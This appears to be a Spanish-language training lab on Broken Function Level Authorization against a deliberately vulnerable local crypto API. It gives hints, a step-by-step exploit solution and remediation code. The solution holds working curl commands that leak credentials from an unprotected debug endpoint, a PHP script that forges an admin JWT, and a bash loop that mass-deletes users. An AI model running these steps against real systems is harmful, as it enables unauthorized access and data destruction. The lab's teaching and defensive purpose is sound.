# LAB 05 - Broken Function Level Authorization (BFLA)

## Referencia OWASP: API5:2023 - Broken Function Level Authorization

---

## Objetivo

Explotar la falta de autorizacion a nivel de funcion en la API de CryptoVulnX para acceder a endpoints administrativos, ejecutar operaciones destructivas sin privilegios y obtener informacion critica del servidor a traves de un endpoint de debug sin proteccion.

---

## Contexto

La vulnerabilidad BFLA (Broken Function Level Authorization) ocurre cuando una API no verifica adecuadamente si el usuario tiene los permisos necesarios para ejecutar una funcion especifica. A diferencia de BOLA (que se enfoca en el acceso a objetos), BFLA se centra en el acceso a funciones y operaciones.

En CryptoVulnX, la autorizacion administrativa tiene multiples fallas:

1. **Verificacion de rol basada en JWT, no en base de datos**: Los endpoints de admin verifican el claim `role` del JWT en lugar de consultar el rol real en la base de datos. Como el secreto JWT es conocido (`crypto123`), cualquier usuario puede forjar un token con `role:admin`.

2. **Verificacion inconsistente por metodo HTTP**: Algunos endpoints verifican autorizacion para peticiones GET pero no para DELETE. Un usuario normal puede eliminar usuarios y transacciones usando el metodo DELETE.

3. **Endpoint de debug sin autenticacion**: El endpoint `/api/v1/admin/debug.php` no requiere ningun tipo de autenticacion y expone informacion critica del servidor incluyendo credenciales de base de datos y el secreto JWT.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `GET` | `/api/v1/admin/users.php` | Lista de usuarios (verifica rol solo desde JWT) |
| `DELETE` | `/api/v1/admin/users.php?id=X` | Eliminar usuario (no verifica rol en DELETE) |
| `DELETE` | `/api/v1/admin/transactions.php?id=X` | Eliminar transaccion (no verifica rol en DELETE) |
| `GET` | `/api/v1/admin/debug.php` | Informacion de debug (sin autenticacion) |

---

## Dificultad

**Media** - Requiere manipulacion de JWT y comprension de las diferencias de autorizacion entre metodos HTTP.

---

## Pistas

### Pista 1 - Debug sin proteccion
Explora la estructura de la API e intenta acceder a rutas comunes de administracion. El path `/api/v1/admin/` puede contener endpoints interesantes. ¿Que pasa si accedes a `debug.php` con el parametro `action=info` directamente desde el navegador, sin ningun token?

### Pista 2 - JWT forjado
Ya conoces el secreto JWT del LAB 02 (o lo puedes obtener desde debug.php). Genera un token con el claim `role` cambiado a `admin`. Los endpoints de administracion confian ciegamente en el valor del JWT sin verificar contra la base de datos.

### Pista 3 - Metodo HTTP importa
Los endpoints de admin verifican la autorizacion cuando recibes datos (GET), pero ¿que pasa cuando envias una peticion DELETE? Prueba a eliminar un usuario o transaccion con tu token de usuario normal usando el metodo DELETE. La verificacion de admin puede no aplicarse a todos los metodos.

---

## Solucion

### Ataque 1 - Endpoint de Debug sin Autenticacion

#### Paso 1 - Acceder a debug.php sin ningun token

```bash
curl -s -X GET "http://localhost/appsec/api/v1/admin/debug.php?action=info"
```

Respuesta esperada:
```json
{
  "server": {
    "php_version": "8.2.12",
    "server_software": "Apache/2.4.58",
    "document_root": "/var/www/html/appsec",
    "server_ip": "172.18.0.2",
    "os": "Linux"
  },
  "database": {
    "host": "db",
    "username": "cryptovulnx_admin",
    "password": "Sup3rS3cr3tDB!",
    "database": "cryptovulnx",
    "port": 3306
  },
  "jwt": {
    "secret": "crypto123",
    "algorithm": "HS256",
    "expiration": 86400
  },
  "api": {
    "version": "1.0",
    "debug_mode": true,
    "rate_limiting": false
  }
}
```

**Sin autenticacion alguna se obtienen credenciales de base de datos, el secreto JWT, y la configuracion completa del servidor.**

---

### Ataque 2 - Forjar JWT con Rol Admin

#### Paso 1 - Autenticarse como usuario normal

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"carlos","password":"carlos2024"}'
```

#### Paso 2 - Generar un JWT con role:admin usando el secreto "crypto123"

```bash
php -r '
$header = base64_encode(json_encode(["alg"=>"HS256","typ"=>"JWT"]));
$payload = base64_encode(json_encode([
    "sub" => 3,
    "username" => "carlos",
    "role" => "admin",
    "iat" => time(),
    "exp" => time() + 86400
]));
$header = rtrim(strtr($header, "+/", "-_"), "=");
$payload = rtrim(strtr($payload, "+/", "-_"), "=");
$signature = rtrim(strtr(base64_encode(hash_hmac("sha256", "$header.$payload", "crypto123", true)), "+/", "-_"), "=");
echo "$header.$payload.$signature\n";
'
```

#### Paso 3 - Acceder al panel de administracion con el JWT forjado

```bash
# Listar todos los usuarios del sistema
curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \
  -H "Authorization: Bearer <TOKEN_FORJADO_ADMIN>"
```

Respuesta esperada:
```json
{
  "users": [
    {"id": 1, "username": "admin", "email": "admin@cryptovulnx.com", "role": "admin", "kyc_verified": 1},
    {"id": 2, "username": "maria", "email": "maria@example.com", "role": "user", "kyc_verified": 1},
    {"id": 3, "username": "carlos", "email": "carlos@example.com", "role": "user", "kyc_verified": 0}
  ]
}
```

**El endpoint confía en el claim `role` del JWT sin verificar contra la base de datos.**

---

### Ataque 3 - DELETE sin Verificacion de Admin

#### Paso 1 - Autenticarse como usuario normal y obtener token

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"carlos","password":"carlos2024"}'
```

#### Paso 2 - Intentar GET a admin endpoint (deberia fallar)

```bash
curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \
  -H "Authorization: Bearer <TOKEN_NORMAL_CARLOS>"
```

Respuesta esperada:
```json
{
  "error": "Acceso denegado. Se requiere rol de administrador."
}
```

#### Paso 3 - Usar DELETE con el mismo token normal (funciona)

```bash
# Eliminar un usuario con token de usuario normal
curl -s -X DELETE "http://localhost/appsec/api/v1/admin/users.php?id=2" \
  -H "Authorization: Bearer <TOKEN_NORMAL_CARLOS>"
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Usuario con ID 2 eliminado exitosamente"
}
```

**El metodo DELETE no verifica si el usuario es administrador.**

#### Paso 4 - Eliminar transacciones con token de usuario normal

```bash
# Eliminar una transaccion
curl -s -X DELETE "http://localhost/appsec/api/v1/admin/transactions.php?id=5" \
  -H "Authorization: Bearer <TOKEN_NORMAL_CARLOS>"
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Transaccion con ID 5 eliminada exitosamente"
}
```

#### Paso 5 - Eliminar multiples registros con un script

```bash
# Eliminar todos los usuarios excepto el propio
for id in 1 2 4 5; do
  echo "[*] Eliminando usuario $id..."
  curl -s -X DELETE "http://localhost/appsec/api/v1/admin/users.php?id=$id" \
    -H "Authorization: Bearer <TOKEN_NORMAL_CARLOS>"
  echo ""
done
```

---

## Remediacion

### 1. Verificar Rol desde la Base de Datos, No desde el JWT

```php
// VULNERABLE - Confiar en el claim del JWT
$decoded = JWT::decode($token, new Key($secret, 'HS256'));
if ($decoded->role !== 'admin') {
    http_response_code(403);
    echo json_encode(["error" => "Acceso denegado"]);
    exit;
}

// SEGURO - Verificar rol en la base de datos
$decoded = JWT::decode($token, new Key($secret, 'HS256'));
$user_id = $decoded->sub;

$stmt = $conn->prepare("SELECT role FROM users WHERE id = ? AND active = 1");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result()->fetch_assoc();

if (!$result || $result['role'] !== 'admin') {
    http_response_code(403);
    echo json_encode(["error" => "Acceso denegado. Se requieren privilegios de administrador."]);
    exit;
}
```

### 2. Autorizacion Consistente para Todos los Metodos HTTP

```php
// VULNERABLE - Solo verifica GET
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    verifyAdminRole($token); // Solo aplica a GET
}

if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
    // Sin verificacion de admin
    $id = $_GET['id'];
    $conn->query("DELETE FROM users WHERE id = $id");
}

// SEGURO - Middleware de autorizacion que aplica a todos los metodos
function requireAdmin() {
    global $conn;
    $token = getBearerToken();

    if (!$token) {
        http_response_code(401);
        echo json_encode(["error" => "Token de autenticacion requerido"]);
        exit;
    }

    try {
        $decoded = JWT::decode($token, new Key(getenv('JWT_SECRET'), 'HS256'));
        $user_id = $decoded->sub;

        // Verificar en base de datos
        $stmt = $conn->prepare("SELECT role FROM users WHERE id = ? AND active = 1");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $user = $stmt->get_result()->fetch_assoc();

        if (!$user || $user['role'] !== 'admin') {
            http_response_code(403);
            echo json_encode(["error" => "Privilegios de administrador requeridos"]);
            exit;
        }

        return $decoded;
    } catch (Exception $e) {
        http_response_code(401);
        echo json_encode(["error" => "Token invalido"]);
        exit;
    }
}

// Aplicar a TODOS los metodos al inicio del archivo admin
$admin_user = requireAdmin(); // Se ejecuta para GET, POST, PUT, DELETE, etc.

switch ($_SERVER['REQUEST_METHOD']) {
    case 'GET':
        listUsers();
        break;
    case 'DELETE':
        deleteUser($_GET['id'], $admin_user);
        break;
    default:
        http_response_code(405);
        echo json_encode(["error" => "Metodo no permitido"]);
}
```

### 3. Proteger o Eliminar Endpoint de Debug

```php
// VULNERABLE - debug.php sin autenticacion
if ($_GET['action'] === 'info') {
    echo json_encode([
        "database" => ["host" => "db", "password" => "Sup3rS3cr3tDB!"],
        "jwt" => ["secret" => "crypto123"]
    ]);
}

// SEGURO - Opcion 1: Eliminar el endpoint en produccion
// Simplemente eliminar debug.php del servidor de produccion

// SEGURO - Opcion 2: Si es necesario para desarrollo, proteger adecuadamente
if (getenv('APP_ENV') !== 'development') {
    http_response_code(404);
    echo json_encode(["error" => "Recurso no encontrado"]);
    exit;
}

// Requiere autenticacion de admin incluso en desarrollo
$admin_user = requireAdmin();

// Nunca exponer credenciales completas
$debug_info = [
    "php_version" => phpversion(),
    "server_time" => date('c'),
    "api_version" => "1.0",
    // NO incluir credenciales, secretos ni informacion sensible
];
echo json_encode($debug_info);
```

### 4. Implementar Control de Acceso Basado en Roles (RBAC)

```php
// Middleware RBAC centralizado
class Authorization {
    private static $permissions = [
        'admin' => ['users.list', 'users.delete', 'transactions.list', 'transactions.delete', 'debug.view'],
        'user'  => ['wallet.view_own', 'transactions.view_own', 'kyc.upload_own'],
    ];

    public static function require(string $permission): object {
        $token = getBearerToken();
        $decoded = JWT::decode($token, new Key(getenv('JWT_SECRET'), 'HS256'));

        // Obtener rol REAL de la base de datos
        $role = self::getRoleFromDB($decoded->sub);

        if (!isset(self::$permissions[$role]) || !in_array($permission, self::$permissions[$role])) {
            http_response_code(403);
            echo json_encode(["error" => "No tienes permiso para realizar esta accion"]);
            exit;
        }

        return $decoded;
    }

    private static function getRoleFromDB(int $user_id): string {
        global $conn;
        $stmt = $conn->prepare("SELECT role FROM users WHERE id = ? AND active = 1");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $result = $stmt->get_result()->fetch_assoc();
        return $result ? $result['role'] : 'none';
    }
}

// Uso en endpoints
// admin/users.php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    Authorization::require('users.list');
    // ... listar usuarios
}
if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
    Authorization::require('users.delete');
    // ... eliminar usuario
}
```

### Principios de Remediacion

1. **Verificar roles en la base de datos**: Nunca confiar en claims del JWT para decisiones de autorizacion. El JWT sirve para identificar al usuario; el rol se verifica en la base de datos.
2. **Autorizacion consistente**: Aplicar las mismas verificaciones de autorizacion a todos los metodos HTTP de un endpoint (GET, POST, PUT, DELETE).
3. **Middleware centralizado**: Implementar la logica de autorizacion en un middleware reutilizable, no en cada endpoint individualmente.
4. **Eliminar endpoints de debug**: No desplegar endpoints de debug en produccion. Si son necesarios, protegerlos con autenticacion fuerte.
5. **Principio de minimo privilegio**: Cada usuario solo debe poder ejecutar las funciones estrictamente necesarias para su rol.
6. **Denegar por defecto**: Si no hay una regla explicita que permita el acceso, denegarlo.
